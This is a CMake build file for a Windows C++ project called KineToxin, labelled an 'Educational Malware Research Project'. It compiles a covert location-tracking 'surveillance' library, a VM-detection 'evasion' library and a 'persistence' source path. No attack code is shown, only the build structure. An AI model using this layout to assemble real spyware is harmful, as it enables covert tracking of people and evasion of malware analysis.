# CMakeLists.txt for KineToxin
cmake_minimum_required(VERSION 3.16)

project(KineToxin VERSION 1.0.0 LANGUAGES CXX)

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Set build type if not specified
if(NOT CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Release)
endif()

# Compiler-specific options
if(MSVC)
    # MSVC specific flags
    add_compile_options(/W4 /WX /permissive-)
    add_compile_definitions(_CRT_SECURE_NO_WARNINGS)
    
    # Release optimizations
    if(CMAKE_BUILD_TYPE STREQUAL "Release")
        add_compile_options(/O2 /Ob2 /DNDEBUG)
    endif()
    
    # Debug information
    if(CMAKE_BUILD_TYPE STREQUAL "Debug")
        add_compile_options(/Od /Zi)
    endif()
endif()

# Include directories
include_directories(
    ${CMAKE_SOURCE_DIR}/src
    ${CMAKE_SOURCE_DIR}/src/utils
    ${CMAKE_SOURCE_DIR}/src/core
    ${CMAKE_SOURCE_DIR}/src/evasion
    ${CMAKE_SOURCE_DIR}/src/persistence
)

# Utility Libraries
set(UTILS_SOURCES
    src/utils/crypto.cpp
    src/utils/crypto.h
    src/utils/logger.cpp
    src/utils/logger.h
    src/utils/config.cpp
    src/utils/config.h
    src/utils/error.cpp
    src/utils/error.h
)

add_library(KineToxinUtils STATIC ${UTILS_SOURCES})

# Core Surveillance Module
set(SURVEILLANCE_SOURCES
    src/core/surveillance/location_tracker.cpp
    src/core/surveillance/location_tracker.h
)

add_library(KineToxinSurveillance STATIC ${SURVEILLANCE_SOURCES})

# Evasion Module
set(EVASION_SOURCES
    src/evasion/vm_detection.cpp
    src/evasion/vm_detection.h
)

add_library(KineToxinEvasion STATIC ${EVASION_SOURCES})

# Link libraries for Windows
if(WIN32)
    target_link_libraries(KineToxinUtils
        advapi32
        crypt32
        user32
        kernel32
        ole32
        oleaut32
        uuid
    )
    
    target_link_libraries(KineToxinSurveillance
        sensorsapi
        locationapi
        ole32
        oleaut32
        uuid
    )
    
    target_link_libraries(KineToxinEvasion
        advapi32
        psapi
        user32
        kernel32
    )
endif()

# Main executable
add_executable(KineToxin src/main.cpp)
target_link_libraries(KineToxin 
    KineToxinUtils 
    KineToxinSurveillance 
    KineToxinEvasion
)

# Testing (using custom test framework)
option(BUILD_TESTS "Build test programs" ON)

if(BUILD_TESTS)
    enable_testing()
    
    # Test executable
    add_executable(KineToxinTests tests/test_main.cpp)
    target_link_libraries(KineToxinTests 
        KineToxinUtils 
        KineToxinSurveillance 
        KineToxinEvasion
    )
    
    # Add test
    add_test(NAME UnitTests COMMAND KineToxinTests)
    
    # Copy test files to build directory
    configure_file(${CMAKE_SOURCE_DIR}/tests/README.md 
                   ${CMAKE_BINARY_DIR}/tests/README.md COPYONLY)
endif()

# Installation rules
install(TARGETS KineToxin KineToxinUtils KineToxinSurveillance KineToxinEvasion
    ARCHIVE DESTINATION lib
    LIBRARY DESTINATION lib
    RUNTIME DESTINATION bin
)

# Package configuration
set(CPACK_PACKAGE_NAME "KineToxin")
set(CPACK_PACKAGE_VERSION ${PROJECT_VERSION})
set(CPACK_PACKAGE_DESCRIPTION "Educational Malware Research Project")
set(CPACK_PACKAGE_CONTACT "Hassan Odowa <solo.research00.00@proton.me>")

include(CPack)
